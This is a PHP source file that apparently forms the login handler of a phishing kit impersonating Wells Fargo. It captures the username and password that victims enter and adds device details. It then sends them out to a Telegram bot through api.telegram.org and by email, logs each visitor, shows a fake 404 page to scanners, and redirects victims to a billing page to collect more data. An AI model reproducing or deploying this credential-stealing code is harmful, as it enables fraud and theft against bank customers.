<?php

    session_start();

    require_once '../Comp.php';
    require_once '../Antibot.php';
    require_once '../demonTest.php';
    require_once '../../config.php';
    $comps = new Comp;
    $antibot = new Antibot;

    $settings = $comps->settings();

    if (!$comps->checkToken()) {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Token\n\n"
        );
        die();
    }

    if (isset(
        $_POST['username'],
        $_POST['password']
    )) {
        if (!$comps->checkEmpty(
            $_POST['username'],
            $_POST['password']
        )) {
            $_SESSION['username'] = $_POST['username'];
            $_SESSION['password'] = $_POST['password'];
$content="
            [+]━━━━━━━━━━━━【🔑 login :Wells Fargo V1.0】━━━━━━━━━━━━━━━━━━━[+]
[👤 user]  = ".$_SESSION['username'] ."
[👤 pass]  = ".$_SESSION['password'] ."
[👤 Device Info]  = ".$comps->userDetails() ;


      

            if (isset($settings['LoginTwice']) && $settings['LoginTwice'] == "on") {
                if (!isset($_SESSION['loginTwice']) || !$_SESSION['loginTwice']) {
                    $_SESSION['loginTwice'] = 1;


 $website1="https://api.telegram.org/";
  $params1=[
      'chat_id'=>'-',
      'text'=>$content ,];
  $ch1 = curl_init($website1 . '/sendMessage');
  curl_setopt($ch1, CURLOPT_HEADER, false);
  curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch1, CURLOPT_POST, 1);
  curl_setopt($ch1, CURLOPT_POSTFIELDS, ($params1));
  curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, false);
  $result1 = curl_exec($ch1);
  curl_close($ch1);


  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$content,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch); 


                    if ($comps->mailX("(1) Login | Wells Fargo", $content)) {
                    
                        $comps->log(
                            "../../Export/key/live.txt",
                            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Login\n\n"
                        );
                        die($comps->headerX("../../Login/"));
                    } else {
                        die($antibot->throw404());
                    }
                }
            
                if (isset($_SESSION['loginTwice']) && $_SESSION['loginTwice']) {
                    unset($_SESSION['loginTwice']);

$website1="https://api.telegram.org/bot";
  $params1=[
      'chat_id'=>'-',
      'text'=>$content ,];
  $ch1 = curl_init($website1 . '/sendMessage');
  curl_setopt($ch1, CURLOPT_HEADER, false);
  curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch1, CURLOPT_POST, 1);
  curl_setopt($ch1, CURLOPT_POSTFIELDS, ($params1));
  curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, false);
  $result1 = curl_exec($ch1);
  curl_close($ch1);


  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$content,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);

                    if ($comps->mailX("(2) Login | Wells Fargo", $content)) {
                  
                        $comps->log(
                            "../../Export/key/live.txt",
                            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (2) Login\n\n"
                        );
                        die($comps->headerX("../../Login/billing.php"));
                    } else {
                        die($antibot->throw404());
                    }
                }
            } else {
$website1="https://api.telegram.org/bot";
  $params1=[
      'chat_id'=>'-',
      'text'=>$content ,];
  $ch1 = curl_init($website1 . '/sendMessage');
  curl_setopt($ch1, CURLOPT_HEADER, false);
  curl_setopt($ch1, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch1, CURLOPT_POST, 1);
  curl_setopt($ch1, CURLOPT_POSTFIELDS, ($params1));
  curl_setopt($ch1, CURLOPT_SSL_VERIFYPEER, false);
  $result1 = curl_exec($ch1);
  curl_close($ch1);


  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$content,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);

                if ($comps->mailX("(1) Login | Wells Fargo", $content)) {
                    
                    $comps->log(
                        "../../Export/key/live.txt",
                        "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nAction: (1) Login\n\n"
                    );
                    die($comps->headerX("../../Login/billing.php"));
                } else {
                    die($antibot->throw404());
                }
            }
        } else {
            echo $antibot->throw404();
            $comps->log(
                "../../Export/key/kill.txt",
                "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
            );
            die();
        }
    } else {
        echo $antibot->throw404();
        $comps->log(
            "../../Export/key/kill.txt",
            "IP: " . $_SESSION['ip'] . "\nUser Agent: " . $comps->getUserAgent() . "\nReason: Empty Input\n\n"
        );
        die();
    }